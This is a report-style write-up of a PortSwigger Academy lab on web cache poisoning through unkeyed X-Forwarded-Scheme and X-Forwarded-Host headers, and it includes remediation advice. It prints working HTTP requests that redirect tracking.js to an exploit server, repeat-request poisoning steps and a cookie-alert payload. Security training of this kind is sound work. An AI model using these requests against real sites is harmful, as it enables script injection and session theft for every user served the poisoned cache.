@@ -1,0 +1,328 @@
+# Web Cache Poisoning via Unkeyed Header (Open Redirect)
+
+## Cover Page
+
+**Lab:** Web Cache Poisoning via an Unkeyed Header
+**Platform:** PortSwigger Web Security Academy
+**Category:** Web Cache Poisoning / Open Redirect / Client-Side Attack
+**Status:** Solved
+**Date:** 31 July 2026
+
+---
+
+# Table of Contents
+
+1. Executive Summary
+2. Risk Rating
+3. Vulnerability Information
+4. Affected Asset
+5. Technical Description
+6. Methodology
+7. Relevant HTTP Requests
+8. Proof of Concept (PoC)
+9. Evidence
+10. Impact Analysis
+11. Root Cause
+12. Remediation
+13. References
+14. Conclusion
+
+---
+
+# 1. Executive Summary
+
+During the assessment, a **Web Cache Poisoning** vulnerability was identified in the application's handling of proxy-related HTTP headers.
+
+The application trusted the client-controlled headers **X-Forwarded-Scheme** and **X-Forwarded-Host** while generating HTTP redirects. Because these headers were not included in the cache key, it was possible to poison the cache with a malicious redirect that instructed clients to retrieve a JavaScript resource from an attacker-controlled domain.
+
+By serving a malicious version of the JavaScript resource, arbitrary JavaScript execution was achieved in the victim's browser.
+
+---
+
+# 2. Risk Rating
+
+| Metric           | Value                                                               |
+| ---------------- | ------------------------------------------------------------------- |
+| Severity         | High                                                                |
+| CVSS v3.1        | 8.8 (High)                                                          |
+| CWE              | CWE-601 – URL Redirection to Untrusted Site                         |
+| Related Weakness | CWE-349 – Acceptance of Extraneous Untrusted Data With Trusted Data |
+| OWASP Top 10     | A05:2021 – Security Misconfiguration                                |
+
+---
+
+# 3. Vulnerability Information
+
+**Vulnerability Type**
+
+Web Cache Poisoning using unkeyed proxy headers leading to JavaScript replacement and Cross-Site Scripting.
+
+**Affected Headers**
+
+```http
+X-Forwarded-Host
+X-Forwarded-Scheme
+```
+
+**Affected Resource**
+
+```text
+/resources/js/tracking.js
+```
+
+---
+
+# 4. Affected Asset
+
+Tracking JavaScript file served by the application:
+
+```text
+/resources/js/tracking.js
+```
+
+---
+
+# 5. Technical Description
+
+The application trusted reverse-proxy headers supplied by the client.
+
+When the request contained:
+
+```http
+X-Forwarded-Scheme: nothttps
+```
+
+the application believed the request had been made over HTTP and generated an HTTPS redirect.
+
+Additionally, the destination hostname was taken directly from:
+
+```http
+X-Forwarded-Host
+```
+
+allowing the attacker to fully control the redirect destination.
+
+Because these headers were ignored by the caching layer, the malicious redirect became cacheable and was subsequently served to other users requesting the JavaScript resource.
+
+---
+
+# 6. Methodology
+
+1. Loaded the application homepage.
+2. Located the request for:
+
+```text
+/resources/js/tracking.js
+```
+
+3. Sent the request to Burp Repeater.
+4. Added a cache-busting parameter to avoid existing cached responses.
+5. Tested the behavior of the `X-Forwarded-Host` header independently.
+6. Tested the behavior of the `X-Forwarded-Scheme` header independently.
+7. Confirmed that any value other than `https` generated a redirect.
+8. Combined both headers to control the redirect destination.
+9. Created a malicious JavaScript file on the exploit server.
+10. Replaced the host with the exploit server domain.
+11. Replayed the request until the response became cached.
+12. Removed the cache-busting parameter.
+13. Continued poisoning the cache until the victim loaded the malicious JavaScript.
+
+---
+
+# 7. Relevant HTTP Requests
+
+## Initial Request
+
+```http
+GET /resources/js/tracking.js HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+```
+
+---
+
+## Redirect Trigger
+
+```http
+GET /resources/js/tracking.js?cb=1234 HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+X-Forwarded-Scheme: nothttps
+```
+
+Response:
+
+```http
+HTTP/2 302 Found
+Location: https://<LAB-ID>.web-security-academy.net/resources/js/tracking.js?cb=1234
+```
+
+---
+
+## Controlled Redirect
+
+```http
+GET /resources/js/tracking.js?cb=1234 HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+X-Forwarded-Scheme: nothttps
+X-Forwarded-Host: exploit-xxxxxxxx.exploit-server.net
+```
+
+Response:
+
+```http
+HTTP/2 302 Found
+Location: https://exploit-xxxxxxxx.exploit-server.net/resources/js/tracking.js?cb=1234
+```
+
+---
+
+## Cache Poisoning Request
+
+```http
+GET /resources/js/tracking.js HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+X-Forwarded-Scheme: nothttps
+X-Forwarded-Host: exploit-xxxxxxxx.exploit-server.net
+```
+
+---
+
+# 8. Proof of Concept (PoC)
+
+The attacker uploaded the following JavaScript to the exploit server:
+
+```javascript
+alert(document.cookie)
+```
+
+The cache was poisoned by repeatedly requesting the JavaScript resource while supplying attacker-controlled forwarding headers.
+
+Subsequent users requesting:
+
+```text
+/resources/js/tracking.js
+```
+
+received a cached redirect pointing to the attacker's infrastructure.
+
+The browser then loaded and executed the malicious JavaScript.
+
+---
+
+# 9. Evidence
+
+## Redirect Generated by the Application
+
+```http
+Location: https://exploit-xxxxxxxx.exploit-server.net/resources/js/tracking.js
+```
+
+---
+
+## Cached Response
+
+```http
+X-Cache: hit
+```
+
+---
+
+## Malicious JavaScript
+
+```javascript
+alert(document.cookie)
+```
+
+---
+
+## Successful Client-Side Execution
+
+When the victim loaded the homepage, the browser requested the poisoned JavaScript resource and executed the attacker-controlled payload.
+
+---
+
+# 10. Impact Analysis
+
+Successful exploitation allows an attacker to:
+
+* Replace trusted JavaScript resources.
+* Execute arbitrary JavaScript in victim browsers.
+* Hijack authenticated sessions.
+* Steal cookies and CSRF tokens.
+* Modify application behavior.
+* Deliver phishing interfaces.
+* Compromise every user receiving the poisoned cached response.
+
+Because the cache is shared, a single successful poisoning operation may affect numerous users until the cache entry expires.
+
+---
+
+# 11. Root Cause
+
+The vulnerability exists because:
+
+* The application trusted client-controlled forwarding headers intended only for reverse proxies.
+* These headers influenced security-sensitive functionality.
+* The cache key did not include these headers.
+* Cached redirects were shared among all users.
+
+This combination enabled cache poisoning and malicious resource substitution.
+
+---
+
+# 12. Remediation
+
+### High Priority
+
+#### Ignore Client-Controlled Proxy Headers
+
+Only trusted reverse proxies should be permitted to set forwarding headers.
+
+---
+
+#### Validate Forwarded Hosts
+
+Accept only allow-listed hostnames.
+
+---
+
+#### Validate Forwarded Scheme
+
+Reject arbitrary values and only trust internally generated protocol information.
+
+---
+
+#### Improve Cache Key Configuration
+
+Any header influencing generated responses must be included in the cache key or excluded from cacheable responses.
+
+---
+
+#### Disable Caching of Dynamic Redirects
+
+Redirects generated using request metadata should not be cached by shared intermediaries.
+
+---
+
+#### Deploy Content Security Policy (CSP)
+
+Restrict script execution to trusted origins to reduce the impact of malicious JavaScript injection.
+
+---
+
+# 13. References
+
+* PortSwigger Web Security Academy – Web Cache Poisoning.
+* OWASP Web Security Testing Guide.
+* OWASP Secure Headers Project.
+* CWE-601 – URL Redirection to Untrusted Site.
+* CWE-349 – Acceptance of Extraneous Untrusted Data With Trusted Data.
+
+---
+
+# 14. Conclusion
+
+The assessment identified a **Web Cache Poisoning** vulnerability caused by the unsafe use of the **X-Forwarded-Scheme** and **X-Forwarded-Host** headers.
+
+An attacker could manipulate these untrusted headers to poison the shared cache with a redirect to an attacker-controlled JavaScript resource. Since the poisoned response was subsequently served to other users, arbitrary JavaScript execution became possible within victims' browsers.
+
+This vulnerability demonstrates the security risks associated with trusting proxy headers without proper validation and highlights the importance of secure cache key design and strict origin validation.
